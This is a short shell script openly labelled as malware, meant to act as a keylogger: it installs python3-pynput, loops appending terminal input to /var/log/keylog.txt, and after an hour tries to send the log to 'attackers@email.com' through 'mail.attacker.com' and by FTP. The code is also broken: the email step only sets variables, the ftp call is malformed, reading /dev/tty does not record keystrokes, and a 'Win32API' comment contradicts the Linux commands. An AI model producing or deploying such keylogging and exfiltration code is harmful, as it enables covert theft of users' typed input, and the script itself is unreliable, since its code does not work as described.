#!/bin/sh

# Define variables
log_file="/var/log/keylog.txt"
interval=3600  # Exfiltrate logs every hour (in seconds)
attacker_email="attackers@email.com"

echo "Malware initialization..."

# Install necessary dependencies for Win32API
sudo apt-get update && sudo apt-get install -y python3-pynput

# Create the log file
echo "Creating log file..."
touch "$log_file"

# Set up keystroke recording
echo "Setting up keystroke recording..."
while true; do
    # Get input from keyboard and append to log file
    echo -n "$(cat /dev/tty)" >> "$log_file"
done &

sleep $interval  # Wait for specified interval

# Exfiltrate logs via email
echo "Exfiltrating logs..."
echo "Log file contents:" $(cat "$log_file")
mailto="$attacker_email" subject="Keylogger log file" smtp_server="mail.attacker.com" smtp_port="587" smtplib_username="username" smtplib_password="password"

# Upload logs via FTP
echo "Uploading logs to FTP server..."
ftp -o "$log_file" "$attacker_email" < /dev/null

exit 0